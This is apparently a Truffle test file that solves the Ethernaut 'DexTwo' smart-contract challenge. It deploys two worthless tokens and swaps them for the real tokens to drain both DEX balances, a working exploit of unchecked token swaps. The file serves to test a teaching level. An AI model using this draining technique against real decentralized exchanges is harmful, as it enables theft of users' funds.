const DexTwoFactory = artifacts.require('DexTwoFactory')
const DexTwo = artifacts.require('DexTwo')
const SwappableTokenTwo = artifacts.require('SwappableTokenTwo')

const utils = require('../utils/TestUtils')

contract('DexTwo', function ([player]) {
  let ethernaut
  let level

  before(async function () {
    ethernaut = await utils.getEthernautWithStatsProxy()
    level = await DexTwoFactory.new()
    await ethernaut.registerLevel(level.address)
  })

  it('should submit level instance successfully', async function () {
    const instance = await utils.createLevelInstance(ethernaut, level.address, player, DexTwo)

    const swapPairs = [
      {
        fromToken: await SwappableTokenTwo.new(instance.address, 'First Fake Token', 'FFT', 2, {
          from: player,
        }),
        toToken: await instance.token1(),
      },
      {
        fromToken: await SwappableTokenTwo.new(instance.address, 'Second Fake Token', 'SFT', 2, {
          from: player,
        }),
        toToken: await instance.token2(),
      },
    ]

    for (const { fromToken, toToken } of swapPairs) {
      await fromToken.transfer(instance.address, 1, {
        from: player,
      })
      await fromToken.approve(player, instance.address, 1)
      await instance.swap(fromToken.address, toToken, 1, {
        from: player,
      })
    }

    const completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player,
    )
    assert.isTrue(completed)
  })
})
